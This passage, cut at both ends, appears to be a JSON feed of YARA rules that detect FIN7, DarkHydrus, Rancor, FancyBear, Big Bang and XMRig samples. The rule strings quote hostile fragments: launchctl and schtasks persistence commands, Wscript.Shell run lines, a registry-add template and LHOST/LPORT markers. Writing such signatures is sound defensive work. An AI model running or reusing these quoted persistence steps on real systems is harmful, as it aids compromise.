2018","minimum_yara":"1.7","name":"APT_FIN7_EXE_Sample_Aug18_5_RID2FE4","reference":"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html","required_modules":[],"rule_hash":"0d28c3976fdbe57bbfd0e494374d4fe9","score":75,"tags":["APT","RUSSIA","EXE","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_FIN7_EXE_Sample_Aug18_6_RID2FE5 : APT DEMO EXE FILE RUSSIA {\n   meta:\n      description = \"Detects sample from FIN7 report in August 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 12:16:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, RUSSIA\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"coreServiceShell.exe\" fullword ascii\n      $s2 = \"PtSessionAgent.exe\" fullword ascii\n      $s3 = \"TiniMetI.exe\" fullword ascii\n      $s4 = \"PwmSvc.exe\" fullword ascii\n      $s5 = \"uiSeAgnt.exe\" fullword ascii\n      $s7 = \"LHOST:\" fullword ascii\n      $s8 = \"TRANSPORT:\" fullword ascii\n      $s9 = \"LPORT:\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and ( pe.exports ( \"TiniStart\" ) or 4 of them )\n}","date":"2018-08-01 12:16:41","description":"Detects sample from FIN7 report in August 2018","minimum_yara":"1.7","name":"APT_FIN7_EXE_Sample_Aug18_6_RID2FE5","reference":"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html","required_modules":["pe"],"rule_hash":"aa3c712d6085d59a241c5b25604692d0","score":75,"tags":["APT","RUSSIA","EXE","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_FIN7_EXE_Sample_Aug18_7_RID2FE6 : APT DEMO EXE FILE RUSSIA {\n   meta:\n      description = \"Detects sample from FIN7 report in August 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 12:16:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"libpng version\" fullword ascii\n      $s2 = \"sdfkjdfjfhgurgvncmnvmfdjdkfjdkfjdf\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of them\n}","date":"2018-08-01 12:16:51","description":"Detects sample from FIN7 report in August 2018","minimum_yara":"1.7","name":"APT_FIN7_EXE_Sample_Aug18_7_RID2FE6","reference":"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html","required_modules":[],"rule_hash":"8bb7bd379468c65dba3fd69188de4527","score":75,"tags":["APT","RUSSIA","EXE","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_FIN7_EXE_Sample_Aug18_8_RID2FE7 : APT DEMO EXE FILE RUSSIA {\n   meta:\n      description = \"Detects sample from FIN7 report in August 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 12:17:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"GetL3st3rr\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them\n}","date":"2018-08-01 12:17:01","description":"Detects sample from FIN7 report in August 2018","minimum_yara":"1.7","name":"APT_FIN7_EXE_Sample_Aug18_8_RID2FE7","reference":"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html","required_modules":[],"rule_hash":"cc7341764212bef3c1e1ccb7c6ab66bb","score":75,"tags":["APT","RUSSIA","EXE","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_FIN7_EXE_Sample_Aug18_10_RID3010 : APT DEMO EXE FILE RUSSIA {\n   meta:\n      description = \"Detects sample from FIN7 report in August 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 12:23:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $c1 = { 00 4C 00 65 00 67 00 61 00 6C 00 43 00 6F 00 70\n               00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 43\n               00 6F 00 70 00 79 00 72 00 69 00 67 00 68 00 74\n               00 20 00 31 00 20 00 2D 00 20 00 31 00 39 00 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 1 of them\n}","date":"2018-08-01 12:23:51","description":"Detects sample from FIN7 report in August 2018","minimum_yara":"1.7","name":"APT_FIN7_EXE_Sample_Aug18_10_RID3010","reference":"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html","required_modules":[],"rule_hash":"c5db62ea6f8b5e4576258bea857020fd","score":75,"tags":["APT","RUSSIA","EXE","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_FIN7_Sample_EXE_Aug18_1_RID2FE0 : APT DEMO EXE FILE RUSSIA {\n   meta:\n      description = \"Detects FIN7 Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 12:15:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"x0=%d, y0=%d, x1=%d, y1=%d\" fullword ascii\n      $s2 = \"dx=%d, dy=%d\" fullword ascii\n      $s3 = \"Error with JP2H box size\" fullword ascii\n      $co1 = { 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n               00 00 00 00 00 00 00 00 00 00 00 2E 63 6F 64 65\n               00 00 00 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of ( $s* ) and $co1 at 0x015D\n}","date":"2018-08-01 12:15:51","description":"Detects FIN7 Sample","minimum_yara":"1.7","name":"APT_FIN7_Sample_EXE_Aug18_1_RID2FE0","reference":"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html","required_modules":[],"rule_hash":"dfb8dcf78be259a2ff4c6db2d4ea009c","score":75,"tags":["APT","RUSSIA","EXE","DEMO","FILE"]},{"author":"Florian Roth","content":"rule MAL_Unknown_Jul18_4_RID2DC0 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects strings found in malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/\"\n      date = \"2018-07-28 10:45:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Error #bdembed1 -- Quiting\" fullword ascii\n      $s2 = \"%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\" fullword ascii\n      $s3 = \"\\\\a.txt\" fullword ascii\n      $s4 = \"command.com\" fullword ascii\n      $s6 = \"DFDHERGDCV\" fullword ascii\n      $s7 = \"DFDHERGGZV\" fullword ascii\n      $s8 = \"%s%s%s%s%s%s%s%s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 5 of them\n}","date":"2018-07-28 10:45:11","description":"Detects strings found in malware samples","minimum_yara":"1.7","name":"MAL_Unknown_Jul18_4_RID2DC0","reference":"https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/","required_modules":[],"rule_hash":"9c57a24ada5685d6e6b93ab4bfea7637","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT_DarkHydrus_Jul18_1_RID2ED9 : APT DEMO EXE FILE MIDDLE_EAST {\n   meta:\n      description = \"Detects strings found in malware samples in APT report in DarkHydrus\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/\"\n      date = \"2018-07-28 11:32:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MIDDLE_EAST\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Z:\\\\devcenter\\\\aggressor\\\\\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( pe.imphash ( ) == \"d3666d1cde4790b22b44ec35976687fb\" or 1 of them )\n}","date":"2018-07-28 11:32:01","description":"Detects strings found in malware samples in APT report in DarkHydrus","minimum_yara":"1.7","name":"APT_DarkHydrus_Jul18_1_RID2ED9","reference":"https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/","required_modules":["pe"],"rule_hash":"b651d033ca15b5028ad57c7886f5a343","score":75,"tags":["APT","DEMO","EXE","FILE","MIDDLE_EAST"]},{"author":"Florian Roth","content":"rule APT_DarkHydrus_Jul18_2_RID2EDA : APT DEMO EXE FILE MIDDLE_EAST {\n   meta:\n      description = \"Detects strings found in malware samples in APT report in DarkHydrus\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/\"\n      date = \"2018-07-28 11:32:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"windir\" fullword ascii\n      $s6 = \"temp.dll\" fullword ascii\n      $s7 = \"libgcj-12.dll\" fullword ascii\n      $s8 = \"%s\\\\System32\\\\%s\" fullword ascii\n      $s9 = \"StartW\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them\n}","date":"2018-07-28 11:32:11","description":"Detects strings found in malware samples in APT report in DarkHydrus","minimum_yara":"1.7","name":"APT_DarkHydrus_Jul18_2_RID2EDA","reference":"https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/","required_modules":[],"rule_hash":"f84af612bfe4e856885feaaa6c911b08","score":75,"tags":["APT","DEMO","EXE","FILE","MIDDLE_EAST"]},{"author":"Florian Roth","content":"rule APT_DarkHydrus_Jul18_3_RID2EDB : APT DEMO EXE FILE MIDDLE_EAST {\n   meta:\n      description = \"Detects strings found in malware samples in APT report in DarkHydrus\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/\"\n      date = \"2018-07-28 11:32:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MIDDLE_EAST\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"Ws2_32.dll\" fullword ascii\n      $s3 = \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( pe.imphash ( ) == \"478eacfbe2b201dabe63be53f34148a5\" or all of them )\n}","date":"2018-07-28 11:32:21","description":"Detects strings found in malware samples in APT report in DarkHydrus","minimum_yara":"1.7","name":"APT_DarkHydrus_Jul18_3_RID2EDB","reference":"https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/","required_modules":["pe"],"rule_hash":"69b866acc6899c583919db3e7e09ebda","score":75,"tags":["APT","DEMO","EXE","FILE","MIDDLE_EAST"]},{"author":"Florian Roth","content":"rule HKTL_beRootexe_RID2C50 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects beRoot.exe which checks common Windows missconfigurations\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/AlessandroZ/BeRoot/tree/master/Windows\"\n      date = \"2018-07-25 09:43:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"checks.webclient.secretsdump(\" fullword ascii\n      $s2 = \"beroot.modules\" fullword ascii\n      $s3 = \"beRoot.exe.manifest\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 18000KB and 1 of them )\n}","date":"2018-07-25 09:43:51","description":"Detects beRoot.exe which checks common Windows missconfigurations","minimum_yara":"1.7","name":"HKTL_beRootexe_RID2C50","reference":"https://github.com/AlessandroZ/BeRoot/tree/master/Windows","required_modules":[],"rule_hash":"faf3b3b4c281fa1a35f00eba5b1215d1","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Tobias Michalski","content":"rule HKTL_beRootexe_output_RID2F60 : DEMO HKTL {\n   meta:\n      description = \"Detects the output of beRoot.exe\"\n      author = \"Tobias Michalski\"\n      reference = \"https://github.com/AlessandroZ/BeRoot/tree/master/Windows\"\n      date = \"2018-07-25 11:54:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"permissions: {'change_config'\" fullword wide\n      $s2 = \"Full path: C:\\\\Windows\\\\system32\\\\msiexec.exe /V\" fullword wide\n      $s3 = \"Full path: C:\\\\Windows\\\\system32\\\\svchost.exe -k DevicesFlow\" fullword wide\n      $s4 = \"! BANG BANG !\" fullword wide\n   condition: \n      filesize < 400KB and 3 of them\n}","date":"2018-07-25 11:54:31","description":"Detects the output of beRoot.exe","minimum_yara":"1.7","name":"HKTL_beRootexe_output_RID2F60","reference":"https://github.com/AlessandroZ/BeRoot/tree/master/Windows","required_modules":[],"rule_hash":"f91e861d691e7bbb698cfd3f5c9acbc7","score":75,"tags":["DEMO","HKTL"]},{"author":"Tobias Michalski","content":"rule HKTL_EmbeddedPDF_RID2C87 : DEMO FILE HKTL {\n   meta:\n      description = \"Detects Embedded PDFs which can start malicious content\"\n      author = \"Tobias Michalski\"\n      reference = \"https://twitter.com/infosecn1nja/status/1021399595899731968?s=12\"\n      date = \"2018-07-25 09:53:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"/Type /Action\\n /S /JavaScript\\n /JS (this.exportDataObject({\" fullword ascii\n      $s1 = \"(This PDF document embeds file\" fullword ascii\n      $s2 = \"/Names << /EmbeddedFiles << /Names\" fullword ascii\n      $s3 = \"/Type /EmbeddedFile\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5025 and 2 of ( $s* ) and $x1\n}","date":"2018-07-25 09:53:01","description":"Detects Embedded PDFs which can start malicious content","minimum_yara":"1.7","name":"HKTL_EmbeddedPDF_RID2C87","reference":"https://twitter.com/infosecn1nja/status/1021399595899731968?s=12","required_modules":[],"rule_hash":"9595397ef6713b499df35a9cc1530720","score":75,"tags":["DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule MAL_OSX_FancyBear_Agent_Jul18_1_RID31DF : DEMO FILE MACOS MAL RUSSIA T1152 T1159 {\n   meta:\n      description = \"Detects FancyBear Agent for OSX\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/DrunkBinary/status/1018448895054098432\"\n      date = \"2018-07-15 13:41:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MACOS, MAL, RUSSIA, T1152, T1159\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"/Users/kazak/Desktop/\" ascii\n      $s1 = \"launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist\" fullword ascii\n      $s2 = \"mkdir -p /Users/Shared/.local/ &> /dev/null\" fullword ascii\n      $s3 = \"chmod 755 /Users/Shared/start.sh\" fullword ascii\n      $s4 = \"chmod 755 %s/%s &> /dev/null\" fullword ascii\n      $s6 = \"chmod 755 /Users/Shared/.local/kextd\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0xfacf and filesize < 3000KB and ( 1 of ( $x* ) and 4 of them )\n}","date":"2018-07-15 13:41:01","description":"Detects FancyBear Agent for OSX","minimum_yara":"1.7","name":"MAL_OSX_FancyBear_Agent_Jul18_1_RID31DF","reference":"https://twitter.com/DrunkBinary/status/1018448895054098432","required_modules":[],"rule_hash":"92f1b3d05e41b9dd965ea61bfe645e20","score":75,"tags":["MACOS","T1152","T1159","MAL","DEMO","FILE","RUSSIA"]},{"author":"Florian Roth","content":"rule APT_ME_BigBang_Gen_Jul18_1_RID2FCC : APT DEMO EXE FILE GEN {\n   meta:\n      description = \"Detects malware from Big Bang campaign against Palestinian authorities\"\n      author = \"Florian Roth\"\n      reference = \"https://research.checkpoint.com/apt-attack-middle-east-big-bang/\"\n      date = \"2018-07-09 12:12:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, GEN\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x2 = \"%@W@%S@c@ri%@p@%t.S@%he@%l%@l\" ascii\n      $x3 = \"S%@h%@e%l%@l.\" ascii\n      $x4 = \"(\\\"S@%t@%a%@rt%@up\\\")\" ascii\n      $x5 = \"aW5zdGFsbCBwcm9nOiBwcm9nIHdpbGwgZGVsZXRlIG9sZCB0bXAgZmlsZQ==\" fullword ascii\n      $x6 = \"aW5zdGFsbCBwcm9nOiBUaGVyZSBpcyBubyBvbGQgZmlsZSBpbiB0ZW1wLg==\" fullword ascii\n      $x7 = \"VXBkYXRlIHByb2c6IFRoZXJlIGlzIG5vIG9sZCBmaWxlIGluIHRlbXAu\" fullword ascii\n      $x8 = \"aW5zdGFsbCBwcm9nOiBDcmVhdGUgVGFzayBhZnRlciA1IG1pbiB0byBydW4gRmlsZSBmcm9tIHRtcA==\" fullword ascii\n      $x9 = \"UnVuIEZpbGU6IE15IHByb2cgaXMgRXhpdC4=\" fullword ascii\n      $x10 = \"li%@%@nk.W%@%@indo@%%@%@%wS%@%@tyle = 3\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( 1 of them or pe.imphash ( ) == \"0f09ea2a68d04f331df9a5d0f8641332\" )\n}","date":"2018-07-09 12:12:31","description":"Detects malware from Big Bang campaign against Palestinian authorities","minimum_yara":"1.7","name":"APT_ME_BigBang_Gen_Jul18_1_RID2FCC","reference":"https://research.checkpoint.com/apt-attack-middle-east-big-bang/","required_modules":["pe"],"rule_hash":"f1e013ec5b8f6aeec6fc98391bc694cc","score":75,"tags":["APT","DEMO","EXE","GEN","FILE"]},{"author":"Florian Roth","content":"rule APT_ME_BigBang_Mal_Jul18_1_RID2FCC : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware from Big Bang report\"\n      author = \"Florian Roth\"\n      reference = \"https://research.checkpoint.com/apt-attack-middle-east-big-bang/\"\n      date = \"2018-07-09 12:12:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%Y%m%d-%I-%M-%S\" fullword ascii\n      $s2 = \"/api/serv/requests/%s/runfile/delete\" fullword ascii\n      $s3 = \"\\\\part.txt\" fullword ascii\n      $s4 = \"\\\\ALL.txt\" fullword ascii\n      $s5 = \"\\\\sat.txt\" fullword ascii\n      $s6 = \"runfile.proccess_name\" fullword ascii\n      $s7 = \"%s%s%p%s%zd%s%d%s%s%s%s%s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 4 of them\n}","date":"2018-07-09 12:12:31","description":"Detects malware from Big Bang report","minimum_yara":"1.7","name":"APT_ME_BigBang_Mal_Jul18_1_RID2FCC","reference":"https://research.checkpoint.com/apt-attack-middle-east-big-bang/","required_modules":[],"rule_hash":"5d7a2550cfecbb2e6fa07d9509252b4b","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule PUA_LNX_XMRIG_CryptoMiner_RID3009 : DEMO FILE LINUX MAL {\n   meta:\n      description = \"Detects XMRIG CryptoMiner software\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-06-28 12:22:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, LINUX, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"--multihash-factor=N              number of hash blocks to process at a time (don't set or 0 enables automatic selection o\" fullword ascii\n      $s2 = \"* COMMANDS:     'h' hashrate, 'p' pause, 'r' resume, 'q' shutdown\" fullword ascii\n      $s3 = \"* THREADS:      %d, %s, aes=%d, hf=%zu, %sdonate=%d%%\" fullword ascii\n      $s4 = \".nicehash.com\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 8000KB and ( 1 of ( $x* ) or 2 of them )\n}","date":"2018-06-28 12:22:41","description":"Detects XMRIG CryptoMiner software","minimum_yara":"1.7","name":"PUA_LNX_XMRIG_CryptoMiner_RID3009","reference":"Internal Research","required_modules":[],"rule_hash":"dfebb470dadd3e1bfd0b1e1968107000","score":75,"tags":["DEMO","LINUX","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT_RANCOR_JS_Malware_RID2E3E : APT DEMO FILE MAL T1053 {\n   meta:\n      description = \"Detects Rancor Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/\"\n      date = \"2018-06-26 11:06:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, MAL, T1053\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \",0,0 >%SystemRoot%\\\\system32\\\\spool\\\\drivers\\\\color\\\\fb.vbs\\\",0,0\" fullword ascii\n      $x2 = \"CreateObject(\\\"Wscript.Shell\\\").Run \\\"explorer.exe \\\"\\\"http\" ascii\n      $x3 = \"CreateObject(\\\"Wscript.Shell\\\").Run \\\"schtasks /create\" ascii\n   condition: \n      uint16 ( 0 ) == 0x533c and filesize < 1KB and 1 of them\n}","date":"2018-06-26 11:06:11","description":"Detects Rancor Malware","minimum_yara":"1.7","name":"APT_RANCOR_JS_Malware_RID2E3E","reference":"https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/","required_modules":[],"rule_hash":"2c3ad5e74ac6c69e11c902c039ca2609","score":75,"tags":["APT","DEMO","T1053","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT_RANCOR_PLAINTEE_Variant_RID2FFF : APT DEMO EXE FILE T1112 {\n   meta:\n      description = \"Detects PLAINTEE malware\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/\"\n      date = \"2018-06-26 12:21:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1112\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"payload.dat\" fullword ascii\n      $s3 = \"temp_microsoft_test.txt\" fullword ascii\n      $s4 = \"reg add %s /v %s /t REG_SZ /d \\\"%s\\\"\" fullword ascii\n      $s6 = \"%s %s,helloworld2\" fullword ascii\n      $s9 = \"%s \\\\\\\"%s\\\\\\\",helloworld\" fullword ascii\n      $s16 = \"recv plugin type %s size:%d\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 3 of them\n}","date":"2018-06-26 12:21:01","description":"Detects PLAINTEE malware","minimum_yara":"1.7","name":"APT_RANCOR_PLAINTEE_Variant_RID2FFF","reference":"https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/","required_modules":[],"rule_hash":"89eb8706e9b0319a15f3fe87091c69e9","score":75,"tags":["APT","DEMO","EXE","T1112","FILE"]},{"author":"Florian Roth","content":"rule APT_RANCOR_PLAINTEE_Malware_Exports_RID3347 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects PLAINTEE malware\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/\"\n      date = \"2018-06-26 14:41:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and pe.exports ( \"Add\" ) and pe.exports ( \"Sub\" ) and pe.exports ( \"DllEntryPoint\" ) and pe.number_of_exports == 3\n}","date":"2018-06-26 14:41:01","description":"Detects PLAINTEE malware","minimum_yara":"1.7","name":"APT_RANCOR_PLAINTEE_Malware_Exports_RID3347","reference":"https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/","required_modules":["pe"],"rule_hash":"13916744f5dbd4b900db9b9f24fa5c06","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT_RANCOR_DDKONG_Malware_Exports_RID32AC : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects DDKONG malware\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/\"\n      date = \"2018-06-26 14:15:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and pe.exports ( \"ServiceMain\" ) and pe.exports ( \"Rundll32Call\" ) and pe.exports ( \"DllEntryPoint\" ) and pe.number_of_exports == 3\n}","date":"2018-06-26 14:15:11","description":"Detects DDKONG malware","minimum_yara":"1.7","name":"APT_RANCOR_DDKONG_Malware_Exports_RID32AC","reference":"https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/","required_modules":["pe"],"rule_hash":"d7560fb5113904c0c354f2bc4b86b911","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT_Thrip_Sample_Jun18_1_RID2FA2 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:05:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"idocback.dll\" fullword ascii\n      $s2 = \"constructor or from DllMain.\" fullword ascii\n      $s3 = \"appmgmt\" fullword ascii\n      $s4 = \"chksrv\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}","date":"2018-06-21 